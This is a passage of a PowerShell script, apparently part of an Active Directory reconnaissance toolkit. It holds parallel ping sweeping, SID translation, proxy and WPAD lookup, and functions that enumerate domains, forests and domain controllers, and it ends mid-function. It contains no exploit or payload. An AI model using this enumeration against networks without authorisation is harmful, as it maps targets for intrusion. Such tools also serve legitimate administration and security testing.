    Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out

    This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.

.EXAMPLE
    $Responding = $Computers | Invoke-Ping
    
    # Create a list of computers that successfully responded to Test-Connection

.LINK
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/Invoke-Ping.ps1
    https://gallery.technet.microsoft.com/scriptcenter/Invoke-Ping-Test-in-b553242a
#>
 
    [cmdletbinding(DefaultParameterSetName='Ping')]
    param(
        [Parameter( ValueFromPipeline=$true,
                    ValueFromPipelineByPropertyName=$true, 
                    Position=0)]
        [string[]]$ComputerName,
        
        [int]$Timeout = 20,
        
        [int]$Throttle = 100,
 
        [Switch]$NoCloseOnTimeout
    )
 
    Begin
    {
        $Quiet = $True
 
        #http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430
        function Invoke-Parallel {
            [cmdletbinding(DefaultParameterSetName='ScriptBlock')]
            Param (   
                [Parameter(Mandatory=$false,position=0,ParameterSetName='ScriptBlock')]
                    [System.Management.Automation.ScriptBlock]$ScriptBlock,
 
                [Parameter(Mandatory=$false,ParameterSetName='ScriptFile')]
                [ValidateScript({test-path $_ -pathtype leaf})]
                    $ScriptFile,
 
                [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
                [Alias('CN','__Server','IPAddress','Server','ComputerName')]    
                    [PSObject]$InputObject,
 
                    [PSObject]$Parameter,
 
                    [Switch]$ImportVariables,
 
                    [Switch]$ImportModules,
 
                    [int]$Throttle = 20,
 
                    [int]$SleepTimer = 200,
 
                    [int]$RunspaceTimeout = 0,
 
                    [Switch]$NoCloseOnTimeout = $false,
 
                    [int]$MaxQueue,
 
                    [Switch] $Quiet = $false
            )
    
            Begin {
                
                #No max queue specified?  Estimate one.
                #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
                if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
                {
                    if($RunspaceTimeout -ne 0){ $script:MaxQueue = $Throttle }
                    else{ $script:MaxQueue = $Throttle * 3 }
                }
                else
                {
                    $script:MaxQueue = $MaxQueue
                }
 
                #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
                if ($ImportVariables -or $ImportModules)
                {
                    $StandardUserEnv = [powershell]::Create().addscript({
 
                        #Get modules and snapins in this clean runspace
                        $Modules = Get-Module | Select -ExpandProperty Name
                        $Snapins = Get-PSSnapin | Select -ExpandProperty Name
 
                        #Get variables in this clean runspace
                        #Called last to get vars like $? into session
                        $Variables = Get-Variable | Select -ExpandProperty Name
                
                        #Return a hashtable where we can access each.
                        @{
                            Variables = $Variables
                            Modules = $Modules
                            Snapins = $Snapins
                        }
                    }).invoke()[0]
            
                    if ($ImportVariables) {
                        #Exclude common parameters, bound parameters, and automatic variables
                        Function _temp {[cmdletbinding()] param() }
                        $VariablesToExclude = @( (Get-Command _temp | Select -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )

                        # we don't use 'Get-Variable -Exclude', because it uses regexps. 
                        # One of the veriables that we pass is '$?'. 
                        # There could be other variables with such problems.
                        # Scope 2 required if we move to a real module
                        $UserVariables = @( Get-Variable | Where { -not ($VariablesToExclude -contains $_.Name) } ) 
                    }
 
                    if ($ImportModules) 
                    {
                        $UserModules = @( Get-Module | Where {$StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path $_.Path -ErrorAction SilentlyContinue)} | Select -ExpandProperty Path )
                        $UserSnapins = @( Get-PSSnapin | Select -ExpandProperty Name | Where {$StandardUserEnv.Snapins -notcontains $_ } ) 
                    }
                }
 
                #region functions
            
                Function Get-RunspaceData {
                    [cmdletbinding()]
                    param( [Switch]$Wait )
 
                    #loop through runspaces
                    #if $wait is specified, keep looping until all complete
                    Do {
 
                        #set more to false for tracking completion
                        $more = $false
 
                        #run through each runspace.           
                        Foreach($runspace in $runspaces) {
                
                            #get the duration - inaccurate
                            $currentdate = Get-Date
                            $runtime = $currentdate - $runspace.startTime
                            $runMin = [math]::Round( $runtime.totalminutes ,2 )
 
                            #set up log object
                            $log = "" | select Date, Action, Runtime, Status, Details
                            $log.Action = "Removing:'$($runspace.object)'"
                            $log.Date = $currentdate
                            $log.Runtime = "$runMin minutes"
 
                            #If runspace completed, end invoke, dispose, recycle, counter++
                            If ($runspace.Runspace.isCompleted) {
                        
                                $script:completedCount++
                    
                                #check if there were errors
                                if($runspace.powershell.Streams.Error.Count -gt 0) {
                            
                                    #set the logging info and move the file to completed
                                    $log.status = "CompletedWithErrors"
                                    foreach($ErrorRecord in $runspace.powershell.Streams.Error) {
                                        Write-Error -ErrorRecord $ErrorRecord
                                    }
                                }
                                else {
                            
                                    #add logging details and cleanup
                                    $log.status = "Completed"
                                }
 
                                #everything is logged, clean up the runspace
                                $runspace.powershell.EndInvoke($runspace.Runspace)
                                $runspace.powershell.dispose()
                                $runspace.Runspace = $null
                                $runspace.powershell = $null
 
                            }
 
                            #If runtime exceeds max, dispose the runspace
                            ElseIf ( $runspaceTimeout -ne 0 -and $runtime.totalseconds -gt $runspaceTimeout) {
                        
                                $script:completedCount++
                                $timedOutTasks = $true
                        
                                #add logging details and cleanup
                                $log.status = "TimedOut"
                                Write-Error "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string)"
 
                                #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                                if (!$noCloseOnTimeout) { $runspace.powershell.dispose() }
                                $runspace.Runspace = $null
                                $runspace.powershell = $null
                                $completedCount++
 
                            }
               
                            #If runspace isn't null set more to true  
                            ElseIf ($runspace.Runspace -ne $null ) {
                                $log = $null
                                $more = $true
                            }
                        }
 
                        #Clean out unused runspace jobs
                        $temphash = $runspaces.clone()
                        $temphash | Where { $_.runspace -eq $Null } | ForEach {
                            $Runspaces.remove($_)
                        }
 
                        #sleep for a bit if we will loop again
                        if($PSBoundParameters['Wait']){ Start-Sleep -milliseconds $SleepTimer }
 
                    #Loop again only if -wait parameter and there are more runspaces to process
                    } while ($more -and $PSBoundParameters['Wait'])
            
                #End of runspace function
                }
 
                #endregion functions
        
                #region Init
 
                if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
                {
                    $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | out-string) )
                }
                elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock')
                {
                    #Start building parameter names for the param block
                    [string[]]$ParamsToAdd = '$_'
                    if( $PSBoundParameters.ContainsKey('Parameter') )
                    {
                        $ParamsToAdd += '$Parameter'
                    }
 
                    $UsingVariableData = $Null
            
                    # This code enables $Using support through the AST.
                    # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!
            
                    if($PSVersionTable.PSVersion.Major -gt 2)
                    {
                        #Extract using references
                        $UsingVariables = $ScriptBlock.ast.FindAll({$args[0] -is [System.Management.Automation.Language.UsingExpressionAst]},$True)    
 
                        If ($UsingVariables)
                        {
                            $List = New-Object 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                            ForEach ($Ast in $UsingVariables)
                            {
                                [void]$list.Add($Ast.SubExpression)
                            }
 
                            $UsingVar = $UsingVariables | Group Parent | ForEach {$_.Group | Select -First 1}
    
                            #Extract the name, value, and create replacements for each
                            $UsingVariableData = ForEach ($Var in $UsingVar) {
                                Try
                                {
                                    $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                                    $NewName = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    [pscustomobject]@{
                                        Name = $Var.SubExpression.Extent.Text
                                        Value = $Value.Value
                                        NewName = $NewName
                                        NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    }
                                    $ParamsToAdd += $NewName
                                }
                                Catch
                                {
                                    Write-Error "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                                }
                            }
 
                            $NewParams = $UsingVariableData.NewName -join ', '
                            $Tuple = [Tuple]::Create($list, $NewParams)
                            $bindingFlags = [Reflection.BindingFlags]"Default,NonPublic,Instance"
                            $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))
    
                            $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))
 
                            $ScriptBlock = [scriptblock]::Create($StringScriptBlock) 
                        }
                    }
            
                    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ", "))`r`n" + $Scriptblock.ToString())
                }
                else
                {
                    Throw "Must provide ScriptBlock or ScriptFile"; Break
                }
 
                Write-Debug "`$ScriptBlock: $($ScriptBlock | Out-String)"
                Write-Verbose "Creating runspace pool and session states"
 
                #If specified, add variables and modules/snapins to session state
                $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
                if ($ImportVariables)
                {
                    if($UserVariables.count -gt 0)
                    {
                        foreach($Variable in $UserVariables)
                        {
                            $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                        }
                    }
                }
                if ($ImportModules)
                {
                    if($UserModules.count -gt 0)
                    {
                        foreach($ModulePath in $UserModules)
                        {
                            $sessionstate.ImportPSModule($ModulePath)
                        }
                    }
                    if($UserSnapins.count -gt 0)
                    {
                        foreach($PSSnapin in $UserSnapins)
                        {
                            [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                        }
                    }
                }
 
                #Create runspace pool
                $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
                $runspacepool.Open() 
 
                $Script:runspaces = New-Object System.Collections.ArrayList        
    
                #If inputObject is bound get a total count and set bound to true
                $global:__bound = $false
                $allObjects = @()
                if( $PSBoundParameters.ContainsKey("inputObject") ){
                    $global:__bound = $true
                }
 
                #endregion INIT
            }
 
            Process {
                #add piped objects to all objects or set all objects to bound input object parameter
                if( -not $global:__bound ){
                    $allObjects += $inputObject
                }
                else{
                    $allObjects = $InputObject
                }
            }
 
            End {
        
                #Use Try/Finally to catch Ctrl+C and clean up.
                Try
                {
                    #counts for progress
                    $totalCount = $allObjects.count
                    $script:completedCount = 0
                    $startedCount = 0
 
                    foreach($object in $allObjects){
        
                        #region add scripts to runspace pool
                    
                            #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                            $powershell = [powershell]::Create()
                    
                            if ($VerbosePreference -eq 'Continue')
                            {
                                [void]$PowerShell.AddScript({$VerbosePreference = 'Continue'})
                            }
 
                            [void]$PowerShell.AddScript($ScriptBlock).AddArgument($object)
 
                            if ($parameter)
                            {
                                [void]$PowerShell.AddArgument($parameter)
                            }
 
                            # $Using support from Boe Prox
                            if ($UsingVariableData)
                            {
                                Foreach($UsingVariable in $UsingVariableData) {
                                    [void]$PowerShell.AddArgument($UsingVariable.Value)
                                }
                            }
 
                            #Add the runspace into the powershell instance
                            $powershell.RunspacePool = $runspacepool
    
                            #Create a temporary collection for each runspace
                            $temp = "" | Select-Object PowerShell, StartTime, object, Runspace
                            $temp.PowerShell = $powershell
                            $temp.StartTime = Get-Date
                            $temp.object = $object
    
                            #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                            $temp.Runspace = $powershell.BeginInvoke()
                            $startedCount++
 
                            #Add the temp tracking info to $runspaces collection
                            $runspaces.Add($temp) | Out-Null
            
                            #loop through existing runspaces one time
                            Get-RunspaceData
 
                            #If we have more running than max queue (used to control timeout accuracy)
                            #Script scope resolves odd PowerShell 2 issue
                            $firstRun = $true
                            while ($runspaces.count -ge $Script:MaxQueue) {
 
                                #give verbose output
                                if($firstRun){
                                    Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                                }
                                $firstRun = $false
                    
                                #run get-runspace data and sleep for a short while
                                Get-RunspaceData
                                Start-Sleep -Milliseconds $sleepTimer
                            }
                        #endregion add scripts to runspace pool
                    }
                     
                    Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where {$_.Runspace -ne $Null}).Count) )
                    Get-RunspaceData -wait
                }
                Finally
                {
                    #Close the runspace pool, unless we specified no close on timeout and something timed out
                    if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($noCloseOnTimeout -eq $false) ) ) {
                        Write-Verbose "Closing the runspace pool"
                        $runspacepool.close()
                    }
                    #collect garbage
                    [gc]::Collect()
                }       
            }
        }
         
        $bound = $PSBoundParameters.keys -contains "ComputerName"
        if(-not $bound)
        {
            [System.Collections.ArrayList]$AllComputers = @()
        }
    }
    Process
    {
        #Handle both pipeline and bound parameter.  We don't want to stream objects, defeats purpose of parallelizing work
        if($bound)
        {
            $AllComputers = $ComputerName
        }
        Else
        {
            foreach($Computer in $ComputerName)
            {
                $AllComputers.add($Computer) | Out-Null
            }
        }
    }
    End
    {
        #Built up the parameters and run everything in parallel
        $params = @()
        $splat = @{
            Throttle = $Throttle
            RunspaceTimeout = $Timeout
            InputObject = $AllComputers
        }
        if($NoCloseOnTimeout)
        {
            $splat.add('NoCloseOnTimeout',$True)
        }
 
        Invoke-Parallel @splat -ScriptBlock {
            $computer = $_.trim()
            Try
            {
                #Pick out a few properties, add a status label.  If quiet output, just return the address
                $result = $null
                if( $result = @( Test-Connection -ComputerName $computer -Count 2 -erroraction Stop ) )
                {
                    $Output = $result | Select -first 1 -Property Address, IPV4Address, IPV6Address, ResponseTime, @{ label = "STATUS"; expression = {"Responding"} }
                    $Output.address
                }
            }
            Catch
            {
            }
        }
    }
}


function Test-Server {
    <#
        .SYNOPSIS
        Tests a connection to a remote server.

        .DESCRIPTION
        This function uses either ping (test-connection) or RPC
        (through WMI) to test connectivity to a remote server.

        .PARAMETER Server
        The hostname/IP to test connectivity to.

        .OUTPUTS
        $True/$False

        .EXAMPLE
        > Test-Server -Server WINDOWS7
        Tests ping connectivity to the WINDOWS7 server.

        .EXAMPLE
        > Test-Server -RPC -Server WINDOWS7
        Tests RPC connectivity to the WINDOWS7 server.

        .LINK
        http://gallery.technet.microsoft.com/scriptcenter/Enhanced-Remote-Server-84c63560
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$true)]
        [String]
        $Server,

        [Switch]
        $RPC
    )

    process {
        if ($RPC){
            $WMIParameters = @{
                            namespace = 'root\cimv2'
                            Class = 'win32_ComputerSystem'
                            ComputerName = $Name
                            ErrorAction = 'Stop'
                          }
            if ($Credential -ne $null)
            {
                $WMIParameters.Credential = $Credential
            }
            try
            {
                Get-WmiObject @WMIParameters
            }
            catch {
                Write-Verbose -Message 'Could not connect via WMI'
            }
        }
        # otherwise, use ping
        else{
            Test-Connection -ComputerName $Server -count 1 -Quiet
        }
    }
}


function Convert-NameToSid {
    <#
    .SYNOPSIS
    Converts a given user/group name to a security identifier (SID).
    
    .PARAMETER Name
    The hostname/IP to test connectivity to.

    .PARAMETER Domain
    Specific domain for the given user account. Otherwise the current domain is used.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        [ValidateNotNullOrEmpty()]
        $Domain
    )
    begin {
        if($Name.contains("\")){
            # if we get a DOMAIN\user format, auto convert it
            $Domain = $Name.split("\")[0]
            $Name = $Name.split("\")[1]
        }
        elseif(-not $Domain){
            $Domain = (Get-NetDomain).Name
        }
    }
    process {
        try {
            $obj = (New-Object System.Security.Principal.NTAccount($Domain,$Name))
            $obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose "invalid name: $domain\$name"
            $Null
        }
    }
}


function Convert-SidToName {
    <#
    .SYNOPSIS
    Converts a security identifier (SID) to a group/user name.
    
    .PARAMETER SID
    The SID to convert.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $SID2 = $SID.trim('*')

            # try to resolve any built-in SIDs first
            #   from https://support.microsoft.com/en-us/kb/243330
            Switch ($SID2)
            {
                'S-1-0'         { 'Null Authority' }
                'S-1-0-0'       { 'Nobody' }
                'S-1-1'         { 'World Authority' }
                'S-1-1-0'       { 'Everyone' }
                'S-1-2'         { 'Local Authority' }
                'S-1-2-0'       { 'Local' }
                'S-1-2-1'       { 'Console Logon ' }
                'S-1-3'         { 'Creator Authority' }
                'S-1-3-0'       { 'Creator Owner' }
                'S-1-3-1'       { 'Creator Group' }
                'S-1-3-2'       { 'Creator Owner Server' }
                'S-1-3-3'       { 'Creator Group Server' }
                'S-1-3-4'       { 'Owner Rights' }
                'S-1-4'         { 'Non-unique Authority' }
                'S-1-5'         { 'NT Authority' }
                'S-1-5-1'       { 'Dialup' }
                'S-1-5-2'       { 'Network' }
                'S-1-5-3'       { 'Batch' }
                'S-1-5-4'       { 'Interactive' }
                'S-1-5-6'       { 'Service' }
                'S-1-5-7'       { 'Anonymous' }
                'S-1-5-8'       { 'Proxy' }
                'S-1-5-9'       { 'Enterprise Domain Controllers' }
                'S-1-5-10'      { 'Principal Self' }
                'S-1-5-11'      { 'Authenticated Users' }
                'S-1-5-12'      { 'Restricted Code' }
                'S-1-5-13'      { 'Terminal Server Users' }
                'S-1-5-14'      { 'Remote Interactive Logon' }
                'S-1-5-15'      { 'This Organization ' }
                'S-1-5-17'      { 'This Organization ' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-19'      { 'NT Authority' }
                'S-1-5-20'      { 'NT Authority' }
                'S-1-5-80-0'    { 'All Services ' }
                'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                'S-1-5-32-545'  { 'BUILTIN\Users' }
                'S-1-5-32-546'  { 'BUILTIN\Guests' }
                'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                Default { 
                    $obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                    $obj.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            # Write-Warning "Invalid SID: $SID"
            $SID
        }
    }
}


function Convert-NT4toCanonical {
    <#
    .SYNOPSIS
    Converts a user/group NT4 name (i.e. dev/john) to canonical format.
    Based on Bill Stewart's code from this article: 
        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats

    .PARAMETER DomainObject
    The user/groupname to convert

    .PARAMETER Domain
    The domain the the user/group is a part of.

    .LINK
    http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
    #>
    [CmdletBinding()]
    param(
        [String]
        $DomainObject,

        [String]
        $Domain
    )

    $DomainObject = $DomainObject -replace "/","\"

    if (-not $Domain) {
        $parts = $DomainObject.split("\")
        if($parts.length -eq 1){
            $Domain = (Get-NetDomain).name
        }
        else {
            $Domain = $parts[0]
        }
    }

    # Accessor functions to simplify calls to NameTranslate
    function Invoke-Method([__ComObject] $object, [String] $method, $parameters) {
        $output = $object.GetType().InvokeMember($method, "InvokeMethod", $NULL, $object, $parameters)
        if ( $output ) { $output }
    }
    function Set-Property([__ComObject] $object, [String] $property, $parameters) {
        [Void] $object.GetType().InvokeMember($property, "SetProperty", $NULL, $object, $parameters)
    }

    $Translate = new-object -comobject NameTranslate

    try {
        Invoke-Method $Translate "Init" (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    Set-Property $Translate "ChaseReferral" (0x60)

    try {
        Invoke-Method $Translate "Set" (3, $DomainObject)
        (Invoke-Method $Translate "Get" (2))
    }
    catch [System.Management.Automation.MethodInvocationException] { }
}


function Get-Proxy {
    <#
        .SYNOPSIS
        Enumerates the proxy server and WPAD conents for the current user.

        .EXAMPLE
        > Get-Proxy 
        Return the current proxy settings.
    #>

    $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $RegKey = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
    $ProxyServer = $RegKey.GetValue('ProxyServer')
    $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')

    if($AutoConfigURL -and ($AutoConfigURL -ne "")){
        try {
            $Wpad = (New-Object Net.Webclient).downloadstring($AutoConfigURL)
        }
        catch {
            $Wpad = ""
        }
    }
    else{
        $Wpad = ""
    }
    
    if($ProxyServer -or $AutoConfigUrl) {
        $out = New-Object psobject
        $out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
        $out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
        $out | Add-Member Noteproperty 'Wpad' $Wpad
        $out
    }
    else {
        Write-Warning "No proxy settings found!"
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Get-NetDomain {
    <#
        .SYNOPSIS
        Returns the name of the current user's domain.

        .PARAMETER Domain
        The domain to query return. If not supplied, the
        current domain is used.

        .EXAMPLE
        > Get-NetDomain
        Return the current domain.

        .LINK
        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain
    )

    if($Domain -and ($Domain -ne "")){
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
        try {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else{
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    }
}


function Get-NetForest {
    <#
        .SYNOPSIS
        Returns the forest specified, or the current forest
        associated with this domain,

        .PARAMETER Forest
        Return the specified forest.

        .EXAMPLE
        > Get-NetForest
        Return current forest.
    #>

    [CmdletBinding()]
    param(
        [String]
        $Forest
    )

    if($Forest){
        # if a forest is specified, try to grab that forest
        $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
        try{
            [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
        }
        catch{
            Write-Warning "The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust."
            $Null
        }
    }
    else{
        # otherwise use the current forest
        [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    }
}


function Get-NetForestDomain {
    <#
        .SYNOPSIS
        Return all domains for the current forest.

        .PARAMETER Forest
        Return domains for the specified forest.

        .PARAMETER Domain
        Return domains that match this term/wildcard.

        .EXAMPLE
        > Get-NetForestDomain
        Return domains apart of the current forest.

        .EXAMPLE
        > Get-NetForestDomain -Forest external.local
        Return domains apart of the 'external.local' forest.
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $Forest
    )

    if($Domain){
        # try to detect a wild card so we use -like
        if($Domain.Contains('*')){
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
        }
        else{
            # match the exact domain name if there's not a wildcard
            (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
        }
    }
    else{
        # return all domains
        (Get-NetForest -Forest $Forest).Domains
    }
}


function Get-NetDomainController {
    <#
        .SYNOPSIS
        Return the current domain controllers for the active domain.

        .PARAMETER Domain
        The domain to query for domain controllers. If not supplied, the
        current domain is used.

        .EXAMPLE
        > Get-NetDomainController
        Returns the domain controllers for the current computer's domain.
        Approximately equivialent to the hostname given in the LOGONSERVER
        environment variable.

        .EXAMPLE
        > Get-NetDomainController -Domain test
        Returns the domain controllers for the domain "test".
    #>

    [CmdletBinding()]
    param(
        [String]
        $Domain
    )

    $d = Get-NetDomain -Domain $Domain
    if($d){
        $d.DomainControllers
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-NetCurrentUser {
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
}


function Get-NameField {
    # function that attempts to extract the appropriate field name
    # from various passed objects. This is so functions can have
    # multiple types of objects passed on the pipeline.
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $object
    )
    process {
        if($object){
            if ( [bool]($object.PSobject.Properties.name -match "dnshostname") ) {
                # objects from Get-NetComputer
                $object.dnshostname
            }
            elseif ( [bool]($object.PSobject.Properties.name -match "name") ) {
                # objects from Get-NetDomainController
                $object.name
            }
            else {
                # strings and catch alls
                $object
            }
        }
        else{
            return $Null
        }
    }
}


function Get-DomainSearcher {
    <#
        .SYNOPSIS
        Helper used by various functions that takes an ADSpath and
        domain specifier and builds the correct ADSI searcher object.

        .PARAMETER Domain
        The domain to use for the query. If not supplied, the
        current domain is used.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER ADSprefix
        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
    #>
    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix
    )

    # if we have an custom adspath specified, use that for the query
    # useful for OU queries
    if($ADSpath) {
        if(!$ADSpath.startswith("LDAP://")){
            $ADSpath = "LDAP://$ADSpath"
        }
        Write-Verbose "Get-DomainSearcher using ADSI search: $ADSpath"
        $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"$ADSpath")
    }

    # if a domain is specified, try to grab that domain
    elseif ($Domain) {

        # if we're reflecting our LDAP queries through a particular domain controller
        if($DomainController) {
            $PrimaryDC = $DomainController
        }
        else {
            # try to grab the primary DC for the current domain
            try{
                $PrimaryDC = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {}
        }

        try {
            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            if ($PrimaryDC) {
                # if we can grab the primary DC for the current domain, use that for the query
                if($ADSprefix) {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$PrimaryDC/$ADSprefix,$dn"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$ADSprefix,$dn")
                }
                else {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$PrimaryDC/$dn"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
                }
            }
            else{
                # otherwise try to connect to the DC for the target domain
                if($ADSprefix) {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$PrimaryDC/$ADSprefix,$dn"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ADSprefix,$dn")
                }
                else {
                    Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$dn"
                    $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
                }
            }
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
            write-warning "error: $_"
            return
        }
    }

    else {
        # otherwise we're just using the current domain for the query.
        $Domain = (Get-NetDomain).name
        $dn = "DC=$($Domain.Replace('.', ',DC='))"

        if($DomainController) {
            # if we're reflecting through a particular DC
            if($ADSprefix) {
                Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$ADSprefix,$dn"
                $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DomainController/$ADSprefix,$dn")
            }
            else {
                Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$DomainController/$dn"
                $DomainSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$DomainController/$dn")
            }
        }
        elseif($ADSprefix) {
            # if we're giving a particular ADS prefix
            Write-Verbose "Get-DomainSearcher using ADSI search: LDAP://$ADSprefix,$dn"
